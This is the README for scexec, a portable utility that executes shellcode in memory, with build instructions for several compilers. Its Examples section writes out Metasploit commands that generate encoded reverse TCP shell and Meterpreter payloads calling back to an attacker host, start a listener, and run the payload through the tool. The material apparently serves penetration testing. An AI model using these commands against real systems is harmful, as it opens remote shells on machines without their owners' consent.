scexec
======

Portable utility to execute in memory a sequence of opcodes

Features
========

- Linux/Windows/Mac support
- Visual C/C++, gcc, mingw32/mingw64 support
- Raw/Alphanumeric/Base64/UUdecode support
- Commandline argument/File support

Examples
========

## Linux target

    $ msfpayload linux/x86/shell_reverse_tcp EXITFUNC=thread LPORT=4444 LHOST=192.168.1.1 R | msfencode -a x86 -e x86/alpha_mixed -t raw BufferRegister=EAX
    $ msfcli multi/handler PAYLOAD=linux/x86/shell_reverse_tcp EXITFUNC=thread LPORT=4444 LHOST=192.168.136.1 E
    $ ./shellcodeexec <msfencode's alphanumeric-encoded payload>

## Windows target

    msfpayload windows/meterpreter/reverse_tcp EXITFUNC=thread LPORT=4444 LHOST=192.168.1.1 R | msfencode -a x86 -e x86/alpha_mixed -t raw BufferRegister=EAX
    msfcli multi/handler PAYLOAD=windows/meterpreter/reverse_tcp EXITFUNC=thread LPORT=4444 LHOST=192.168.1.1 E
    C:\>shellcodeexec.exe <msfencode's alphanumeric-encoded payload>

Building
========

### Linux/Mac/POSIX builds

Just type:

    make

### Mingw builds:

32 bit:

    make CC=i686-w64-mingw32-gcc STRIP=i686-w64-mingw32-strip OUT=scexec32.exe

64 bit:

    make CC=x86_64-w64-mingw32-gcc STRIP=x86_64-w64-mingw32-strip OUT=scexec64.exe

### Visual Studio:

32 bit:

    nmake /f Makefile.vc

64 bit:

    nmake /f Makefile.v64

